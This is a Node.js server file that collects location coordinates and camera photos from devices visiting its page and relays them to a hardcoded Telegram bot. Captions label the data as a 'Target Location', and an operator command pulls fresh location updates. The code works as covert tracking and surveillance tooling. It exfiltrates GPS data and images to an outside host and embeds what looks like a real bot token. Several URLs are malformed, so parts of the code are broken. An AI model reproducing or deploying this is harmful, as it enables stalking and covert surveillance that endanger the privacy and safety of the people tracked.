const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');

// --- TELEGRAM CONFIGURATION ---
const TELEGRAM_BOT_TOKEN = "8800421642:AAFaQPILSBVnrlPOy_rmoSwAmYl5FRC9s_8";
const TELEGRAM_CHAT_ID = "8714686528"; 

// --- TRACKING LOGIC FLAGS ---
let singleUpdateRequested = false;
let knownDevices = {};

function sendTelegramMessage(text) {
    const data = JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: "Markdown" });
    const options = {
        hostname: 'api.telegram.org', port: 443, path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
    };
    const req = https.request(options, () => {});
    req.write(data); req.end();
}

function sendTelegramPhoto(caption, imageBuffer) {
    const boundary = '----WebKitFormBoundary' + Math.random().toString(36).substring(2);
    const filename = 'selfie.jpg';
    
    const header = `--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${TELEGRAM_CHAT_ID}\r\n` +
                   `--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n` +
                   `--${boundary}\r\nContent-Disposition: form-data; name="parse_mode"\r\n\r\nMarkdown\r\n` +
                   `--${boundary}\r\nContent-Disposition: form-data; name="photo"; filename="${filename}"\r\nContent-Type: image/jpeg\r\n\r\n`;
    const footer = `\r\n--${boundary}--\r\n`;

    const options = {
        hostname: 'api.telegram.org', port: 443, path: `/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
        method: 'POST', headers: { 'Content-Type': `multipart/form-data; boundary=${boundary}` }
    };

    const req = https.request(options, () => {});
    req.write(Buffer.from(header, 'utf-8'));
    req.write(imageBuffer);
    req.write(Buffer.from(footer, 'utf-8'));
    req.end();
}

let lastUpdateId = 0;
function pollTelegramUpdates() {
    https.get(`https://telegram.org{TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`, (res) => {
        let data = '';
        res.on('data', (chunk) => data += chunk);
        res.on('end', () => {
            try {
                const response = JSON.parse(data);
                if (response.ok && response.result.length > 0) {
                    for (let update of response.result) {
                        lastUpdateId = update.update_id;
                        if (update.message && String(update.message.chat.id) === TELEGRAM_CHAT_ID) {
                            const text = update.message.text ? update.message.text.trim() : "";
                            if (text === "/update") {
                                singleUpdateRequested = true;
                                sendTelegramMessage("🔄 *Request acknowledged.* Waiting for the next live phone transmission update...");
                            }
                        }
                    }
                }
            } catch (e) {}
            pollTelegramUpdates();
        });
    }).on('error', (err) => { setTimeout(pollTelegramUpdates, 5000); });
}

const server = http.createServer((req, res) => {
    const userAgent = req.headers['user-agent'] || '';
    if (userAgent.toLowerCase().includes('uptimerobot')) {
        res.writeHead(200, { 'Content-Type': 'text/plain' }); res.end("OK"); return;
    }

    if (req.method === 'GET') {
        fs.readFile(path.join(__dirname, 'index.html'), (err, content) => {
            if (err) {
                res.writeHead(500); res.end("Missing index.html file");
                return;
            }
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(content);
        });
    } 
    else if (req.method === 'POST' && req.url === '/update') {
        let body = '';
        req.on('data', chunk => body += chunk.toString());
        req.on('end', () => {
            try {
                const coords = JSON.parse(body);
                const time = new Date().toLocaleTimeString();
                let shouldSendAlert = false;

                if (!knownDevices[coords.name]) {
                    knownDevices[coords.name] = true;
                    shouldSendAlert = true;
                } else if (singleUpdateRequested) {
                    singleUpdateRequested = false; 
                    shouldSendAlert = true;
                }

                if (shouldSendAlert) {
                    const mapsLink = `https://google.com{coords.lat},${coords.lon}`;
                    const msg = `🚨 *Location Update Alert!*\n👤 *Device:* ${coords.name}\n⏰ *Time:* ${time}\n📍 *Coords:* ${coords.lat}, ${coords.lon}\n\n🗺️ [View on Google Maps](${mapsLink})`;
                    sendTelegramMessage(msg);
                }
            } catch (e) {}
            res.writeHead(200); res.end();
        });
    } 
    else if (req.method === 'POST' && req.url === '/photo') {
        let body = '';
        req.on('data', chunk => body += chunk.toString());
        req.on('end', () => {
            try {
                const payload = JSON.parse(body);
                const time = new Date().toLocaleTimeString();
                
                const base64Data = payload.image.replace(/^data:image\/jpeg;base64,/, "");
                const imgBuffer = Buffer.from(base64Data, 'base64');
                
                const captionText = `📸 *Visual Safety Check-In Received!*\n👤 *From:* ${payload.name}\n⏰ *Time:* ${time}\n🗺️ [Open Google Maps Target Location](https://google.com{payload.lat},${payload.lon})`;
                
                sendTelegramPhoto(captionText, imgBuffer);
            } catch (e) {}
            res.writeHead(200); res.end();
        });
    }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => { pollTelegramUpdates(); });
